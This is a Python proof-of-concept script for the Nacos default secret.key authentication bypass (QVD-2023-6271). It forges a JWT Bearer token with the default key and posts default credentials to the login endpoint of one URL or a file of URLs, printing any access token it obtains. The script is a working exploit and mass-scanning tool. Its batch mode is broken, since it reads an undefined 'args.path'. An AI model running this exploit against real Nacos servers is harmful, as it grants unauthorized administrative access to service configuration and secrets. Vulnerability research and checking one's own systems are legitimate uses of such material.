import argparse
import requests
import threading

'''
+-----------------------------------------------------------------+
漏洞名称: Nacos 默认 secret.key 配置不当权限绕过漏洞 QVD-2023-6271
影响版本: 0.1.0<= Nacos <= 2.2.0                              
单个检测：python nacos_qvd_2023_6271.py -u url
批量检测：python nacos_qvd_2023_6271.py -f file.txt
参考链接：https://www.cnblogs.com/spmonkey/p/17504263.html
+-----------------------------------------------------------------+                                     
'''

# 伪造用户登录时的请求头和请求数据
headers = {
    "User-Agent": "Firefox/124.0",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4"
                     "MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}

data = {"username": "nacos", "password": "nacos123"}


# 定义函数，用于发起POST请求并判断回显结果，每次调用这个函数发送一个请求
def send_request(url):
    mid_urls = ['', '/nacos', '/home/nocos']
    end_url = '/v1/auth/users/login'
    for mid_url in mid_urls:
        full_url = url + mid_url + end_url
        try:
            response = requests.post(full_url, headers=headers, data=data, timeout=2)
            if response.status_code == 200 and response.json().get('accessToken'):
                print(f'{url} 存在token.secret.key默认配置漏洞')
                print(f'{response.json()}')
                return
        except requests.exceptions.RequestException as e:
            print(f'{url} 访问失败 {e}')
            return

    print('不存在token.secret.key默认配置漏洞')


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=None,
                        help='目标地址，带上http(s)://')
    parser.add_argument('-f',
                        '--file',
                        type=str,
                        default=None,
                        help='批量检测，带上http(s)://')
    args = parser.parse_args()

    if args.url:
        send_request(args.url)

    if args.file:
        # 从url.txt文件中读取URL列表
        with open(args.path, 'r') as f:
            urls = f.read().splitlines()

        threads = []
        for url in urls:
            t = threading.Thread(target=send_request, args=(url,))
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()
